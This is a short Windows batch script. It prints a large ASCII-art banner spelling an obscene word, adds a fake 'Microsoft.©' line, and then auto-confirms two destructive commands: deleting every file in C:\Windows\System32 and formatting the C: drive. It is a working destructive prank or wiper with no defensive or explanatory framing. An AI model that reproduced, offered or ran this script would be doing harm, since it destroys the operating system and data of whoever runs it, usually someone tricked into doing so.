@echo off
color C

echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo:
echo þþþþþþþþþþ   þþ      þþ   þþþþþþþþþþ   þþ     þþ
echo þþþþþþþþþþ   þþ      þþ   þþþþþþþþþþ   þþ     þþ
echo þþ           þþ      þþ   þþ           þþ   þþ
echo þþ           þþ      þþ   þþ           þþ þþ
echo þþþþþþ       þþ      þþ   þþ           þþþ
echo þþþþþþ       þþ      þþ   þþ           þþ þþ
echo þþ           þþ      þþ   þþ           þþ   þþ
echo þþ           þþþþþþþþþþ   þþþþþþþþþþ   þþ     þþ
echo þþ           þþþþþþþþþþ   þþþþþþþþþþ   þþ     þþ 
echo:   
echo ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo Microsoft.©

echo o | del C:\Windows\System32\*.*
pause

echo o | format c:


echo.

